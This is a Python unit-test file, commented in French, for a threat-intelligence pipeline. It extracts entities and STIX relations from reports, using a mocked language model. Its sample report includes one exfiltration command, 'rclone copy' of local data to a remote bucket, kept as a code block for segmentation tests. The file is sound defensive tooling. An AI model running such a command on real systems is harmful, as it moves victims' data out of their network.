"""Tests de l'extraction avec un faux modèle : `uv run python -m unittest tests.test_extraction_pipeline -v`."""

import json
import unittest
from unittest import mock

from backend.extracting import llm, pipeline, segment, stages

ARTICLE = """# Rapport

## Accès initial

En octobre 2024, le cluster UNC3944 a exploité la vulnérabilité CVE-2023-4966 sur un équipement Citrix. Le groupe a ensuite déployé BlackCat sur le réseau de la victime.

## Mouvement latéral

L'acteur a utilisé PsExec pour se déplacer latéralement. Mandiant a observé powershell.exe et l'outil rclone.exe pour l'exfiltration.

```
rclone copy C:\\data remote:bucket
```

| Technique | ID |
| --- | --- |
| PowerShell | T1059.001 |
"""


def fake_generate(system, prompt, schema, **kw):
    """Réponses du faux modèle : repère l'étape par le schéma, lit les numéros de phrase dans le prompt."""
    if "entities" in schema["properties"]:
        items = ["intrusion-set|UNC3944", "malware|BlackCat", "tool|PsExec", "tool|rclone", "vulnerability|CVE-2023-4966",
                 "threat-actor|Mandiant", "malware|malware", "ligne illisible", "location|FR"]  # noqa: E501
        return llm.LLMResult({"entities": items}, "", 800, 60, 1.0, {"generate": 1.0})
    import re

    ids = {l.split(" ", 2)[2]: l.split(" ", 2)[0] for l in prompt.split("EXTRAIT")[0].splitlines() if re.match(r"^E\d+ ", l)}
    actor = "Scattered Spider"  # UNC3944 est remplacé par le nom canonique ATT&CK avant l'étape relations
    uid = {}
    for line in prompt.splitlines():
        if line.startswith("["):
            uid[line] = int(line[1 : line.index("]")])

    def find(word):
        return next(u for l, u in uid.items() if word in l)

    rels = []
    if "BlackCat" in ids:
        rels.append(f"{find('BlackCat')}|{ids[actor]}|uses|{ids['BlackCat']}")
    rels.append(f"{find('CVE-2023-4966')}|{ids[actor]}|exploits|{ids['CVE-2023-4966']}")  # invalide : un groupe ne fait que cibler
    rels.append(f"{find('PsExec')}|{ids[actor]}|uses|{ids['PsExec']}") if "PsExec" in ids else None
    rels.append("9999|E1|uses|E2")  # phrase inexistante
    rels.append("1|E99|uses|E1")  # entité inexistante
    return llm.LLMResult({"relations": [r for r in rels if r]}, "", 1500, 90, 2.0, {"generate": 2.0})


class Segmentation(unittest.TestCase):
    def test_units_are_numbered_sentences_with_heading_paths(self):
        units = segment.segment(ARTICLE)
        self.assertEqual([u.uid for u in units], list(range(1, len(units) + 1)))
        kinds = {u.kind for u in units}
        self.assertEqual(kinds, {"sentence", "code", "table"})
        first = units[0]
        self.assertEqual(first.heading_path, "Rapport > Accès initial")
        self.assertTrue(first.text.startswith("En octobre 2024"))
        self.assertTrue(any("rclone copy" in u.text for u in units if u.kind == "code"))

    def test_sentence_splitter_keeps_filenames_versions_and_abbreviations(self):
        text = "Le binaire cmd.exe lance v1.2.3 de l'outil (e.g. PsExec). Puis le groupe agit. Il part en 2024. Fin."
        parts = segment.split_sentences(text)
        self.assertEqual(len(parts), 4, parts)  # ni « cmd.exe », ni « v1.2.3 », ni « e.g. » ne coupent une phrase
        self.assertIn("cmd.exe", parts[0])
        self.assertIn("e.g. PsExec", parts[0])

    def test_passes_never_split_a_unit_and_respect_budget(self):
        units = segment.segment(ARTICLE * 6)
        passes = segment.make_passes(units, max_chars=700)
        self.assertGreater(len(passes), 1)
        self.assertEqual([u.uid for p in passes for u in p.units], [u.uid for u in units])
        self.assertTrue(all(sum(len(u.prompt_text) for u in p.units) <= 700 + 400 for p in passes))


class StageParsing(unittest.TestCase):
    def test_entity_lines(self):
        items = ["malware|Qakbot|QBot;Pinkslipbot", "tool|PsExec", "bizarre", "location|", "unknown|X|Y", "malware|a"]
        ents, dropped = stages.parse_entities(items, ("malware", "tool", "location"))
        self.assertEqual([(e["type"], e["name"]) for e in ents], [("malware", "Qakbot"), ("tool", "PsExec")])
        self.assertEqual(ents[0]["aliases"], ["QBot", "Pinkslipbot"])
        self.assertEqual(dropped, 4)

    def test_relation_lines(self):
        rels, dropped = stages.parse_relations(["3|E1|uses|E2", " 4 | E2 | targets | E1 ", "x|E1|uses|E2", "3|E1|uses|E9", "99|E1|uses|E2"], {"E1", "E2"}, {3, 4})
        self.assertEqual(rels, [(3, "E1", "uses", "E2"), (4, "E2", "targets", "E1")])
        self.assertEqual(dropped, 3)

    def test_relation_schema_restricts_relation_names(self):
        import re

        pattern = stages.relation_schema(("uses", "targets"))["properties"]["relations"]["items"]["pattern"]
        self.assertTrue(re.match(pattern, "12|E3|uses|E7"))
        self.assertFalse(re.match(pattern, "12|E3|invente|E7"))
        self.assertFalse(re.match(pattern, "12|E3|uses-extra|E7"))

    def test_kb_hints_use_exact_case_and_ignore_commands(self):
        units = segment.segment("Le groupe Scattered Spider utilise Cobalt Strike. La commande net group et le shell sont courants. Impacket aussi.")
        names = [n for n, _ in stages.kb_hints(units)]
        self.assertIn("Scattered Spider", names)
        self.assertIn("Cobalt Strike", names)
        self.assertIn("Impacket", names)
        self.assertNotIn("Net", names)
        self.assertFalse([n for n in names if n.lower() in ("shell", "page")])


class FullPipeline(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        with mock.patch.object(llm, "generate", side_effect=fake_generate):
            cls.result = pipeline.extract_article(1, "Rapport", "operational", ARTICLE, site_name="mandiant", workers=2)
        g = cls.result.graph
        cls.names = {e["id"]: e["name"] for e in g.entities}
        cls.triples = {(cls.names[r["source_ref"]], r["relationship_type"], cls.names[r["target_ref"]]) for r in g.relationships}
        cls.codes = [i.code for i in g.issues]

    def test_entities_are_cleaned_before_relations(self):
        self.assertIn("PUBLISHER_AS_ADVERSARY", self.codes)  # Mandiant = site_name
        self.assertIn("GENERIC_TERM", self.codes)
        self.assertNotIn("Mandiant", self.names.values())
        self.assertEqual(self.result.dropped_entity_lines, 1)  # « ligne illisible » ; `location` est un type du profil

    def test_only_valid_grounded_relations_survive(self):
        self.assertIn(("Scattered Spider", "uses", "BlackCat"), self.triples)
        self.assertIn(("Scattered Spider", "uses", "PsExec"), self.triples)
        self.assertNotIn("exploits", {t[1] for t in self.triples})  # invalide en STIX pour un groupe
        self.assertIn("INVALID_RELATIONSHIP", self.codes)
        self.assertEqual(self.result.dropped_relation_lines, 2)  # phrase et entité inexistantes

    def test_evidence_is_the_cited_sentence_text(self):
        for r in self.result.graph.relationships:
            quote = r["_evidence"][0]["quote"]
            self.assertIn(quote.split()[0], ARTICLE)
            self.assertTrue(r["_evidence"][0]["section"].startswith("Rapport"))

    def test_stats_are_collected(self):
        self.assertTrue(self.result.calls)
        self.assertEqual({c.stage for c in self.result.calls}, {"entities", "relations"})
        self.assertGreater(self.result.output_tokens, 0)

    def test_unknown_category_is_refused(self):
        with self.assertRaises(ValueError):
            pipeline.extract_article(1, "t", "out_of_scope", ARTICLE)


if __name__ == "__main__":
    unittest.main()
